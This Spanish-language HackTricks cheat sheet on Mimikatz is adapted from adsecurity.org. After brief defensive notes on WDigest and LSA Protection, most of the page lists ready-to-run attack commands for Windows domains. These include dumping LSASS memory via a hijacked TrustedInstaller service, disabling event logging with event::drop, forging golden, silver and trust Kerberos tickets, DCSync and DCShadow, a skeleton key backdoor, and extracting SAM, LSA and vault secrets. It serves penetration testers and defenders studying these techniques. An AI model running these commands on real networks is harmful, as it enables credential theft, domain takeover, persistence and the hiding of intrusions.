# Mimikatz

{{#include ../../banners/hacktricks-training.md}}

**Esta página se basa en una de [adsecurity.org](https://adsecurity.org/?page_id=1821)**. ¡Consulta el original para más información!

## LM y texto claro en memoria

Desde Windows 8.1 y Windows Server 2012 R2 en adelante, se han implementado medidas significativas para proteger contra el robo de credenciales:

- **Los hashes LM y las contraseñas en texto claro** ya no se almacenan en memoria para mejorar la seguridad. Se debe configurar un ajuste específico del registro, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ con un valor DWORD de `0` para deshabilitar la Autenticación Digest, asegurando que las contraseñas "en texto claro" no se almacenen en caché en LSASS.

- **La Protección LSA** se introduce para proteger el proceso de la Autoridad de Seguridad Local (LSA) de la lectura no autorizada de memoria y la inyección de código. Esto se logra marcando el LSASS como un proceso protegido. La activación de la Protección LSA implica:
1. Modificar el registro en _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ configurando `RunAsPPL` a `dword:00000001`.
2. Implementar un Objeto de Política de Grupo (GPO) que haga cumplir este cambio de registro en los dispositivos gestionados.

A pesar de estas protecciones, herramientas como Mimikatz pueden eludir la Protección LSA utilizando controladores específicos, aunque tales acciones probablemente se registren en los registros de eventos.

### Contrarrestar la eliminación de SeDebugPrivilege

Los administradores suelen tener SeDebugPrivilege, lo que les permite depurar programas. Este privilegio puede ser restringido para prevenir volcado de memoria no autorizado, una técnica común utilizada por los atacantes para extraer credenciales de la memoria. Sin embargo, incluso con este privilegio eliminado, la cuenta TrustedInstaller aún puede realizar volcado de memoria utilizando una configuración de servicio personalizada:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Esto permite volcar la memoria de `lsass.exe` a un archivo, que luego puede ser analizado en otro sistema para extraer credenciales:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Opciones de Mimikatz

La manipulación de registros de eventos en Mimikatz implica dos acciones principales: borrar registros de eventos y parchear el servicio de eventos para evitar el registro de nuevos eventos. A continuación se presentan los comandos para realizar estas acciones:

#### Borrado de Registros de Eventos

- **Comando**: Esta acción tiene como objetivo eliminar los registros de eventos, dificultando el seguimiento de actividades maliciosas.
- Mimikatz no proporciona un comando directo en su documentación estándar para borrar registros de eventos directamente a través de su línea de comandos. Sin embargo, la manipulación de registros de eventos generalmente implica el uso de herramientas del sistema o scripts fuera de Mimikatz para borrar registros específicos (por ejemplo, usando PowerShell o el Visor de Eventos de Windows).

#### Función Experimental: Parcheo del Servicio de Eventos

- **Comando**: `event::drop`
- Este comando experimental está diseñado para modificar el comportamiento del Servicio de Registro de Eventos, evitando efectivamente que registre nuevos eventos.
- Ejemplo: `mimikatz "privilege::debug" "event::drop" exit`

- El comando `privilege::debug` asegura que Mimikatz opere con los privilegios necesarios para modificar servicios del sistema.
- El comando `event::drop` luego parchea el servicio de Registro de Eventos.

### Ataques de Tickets de Kerberos

### Creación de Golden Ticket

Un Golden Ticket permite la suplantación de acceso a nivel de dominio. Comando clave y parámetros:

- Comando: `kerberos::golden`
- Parámetros:
- `/domain`: El nombre del dominio.
- `/sid`: El Identificador de Seguridad (SID) del dominio.
- `/user`: El nombre de usuario a suplantar.
- `/krbtgt`: El hash NTLM de la cuenta de servicio KDC del dominio.
- `/ptt`: Inyecta directamente el ticket en la memoria.
- `/ticket`: Guarda el ticket para su uso posterior.

Ejemplo:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Creación de Silver Ticket

Los Silver Tickets otorgan acceso a servicios específicos. Comando clave y parámetros:

- Comando: Similar al Golden Ticket pero se dirige a servicios específicos.
- Parámetros:
- `/service`: El servicio a dirigir (por ejemplo, cifs, http).
- Otros parámetros similares al Golden Ticket.

Ejemplo:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Creación de Tickets de Confianza

Los Tickets de Confianza se utilizan para acceder a recursos a través de dominios aprovechando las relaciones de confianza. Comando clave y parámetros:

- Comando: Similar al Golden Ticket pero para relaciones de confianza.
- Parámetros:
- `/target`: El FQDN del dominio objetivo.
- `/rc4`: El hash NTLM para la cuenta de confianza.

Ejemplo:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Comandos Adicionales de Kerberos

- **Listar Tickets**:

- Comando: `kerberos::list`
- Lista todos los tickets de Kerberos para la sesión actual del usuario.

- **Pasar la Caché**:

- Comando: `kerberos::ptc`
- Inyecta tickets de Kerberos desde archivos de caché.
- Ejemplo: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pasar el Ticket**:

- Comando: `kerberos::ptt`
- Permite usar un ticket de Kerberos en otra sesión.
- Ejemplo: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purgar Tickets**:
- Comando: `kerberos::purge`
- Limpia todos los tickets de Kerberos de la sesión.
- Útil antes de usar comandos de manipulación de tickets para evitar conflictos.

### Manipulación de Active Directory

- **DCShadow**: Hacer que una máquina actúe temporalmente como un DC para la manipulación de objetos de AD.

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Imitar un DC para solicitar datos de contraseñas.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Acceso a Credenciales

- **LSADUMP::LSA**: Extraer credenciales de LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Suplantar un DC usando los datos de contraseña de una cuenta de computadora.

- _No se proporcionó un comando específico para NetSync en el contexto original._

- **LSADUMP::SAM**: Acceder a la base de datos SAM local.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Desencriptar secretos almacenados en el registro.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Establecer un nuevo hash NTLM para un usuario.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Recuperar información de autenticación de confianza.
- `mimikatz "lsadump::trust" exit`

### Varios

- **MISC::Skeleton**: Inyectar un backdoor en LSASS en un DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Escalación de Privilegios

- **PRIVILEGE::Backup**: Adquirir derechos de respaldo.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Obtener privilegios de depuración.
- `mimikatz "privilege::debug" exit`

### Volcado de Credenciales

- **SEKURLSA::LogonPasswords**: Mostrar credenciales de usuarios conectados.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Extraer tickets de Kerberos de la memoria.
- `mimikatz "sekurlsa::tickets /export" exit`

### Manipulación de SID y Token

- **SID::add/modify**: Cambiar SID y SIDHistory.

- Agregar: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modificar: _No se proporcionó un comando específico para modificar en el contexto original._

- **TOKEN::Elevate**: Suplantar tokens.
- `mimikatz "token::elevate /domainadmin" exit`

### Servicios de Terminal

- **TS::MultiRDP**: Permitir múltiples sesiones RDP.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Listar sesiones TS/RDP.
- _No se proporcionó un comando específico para TS::Sessions en el contexto original._

### Bóveda

- Extraer contraseñas de Windows Vault.
- `mimikatz "vault::cred /patch" exit`


{{#include ../../banners/hacktricks-training.md}}
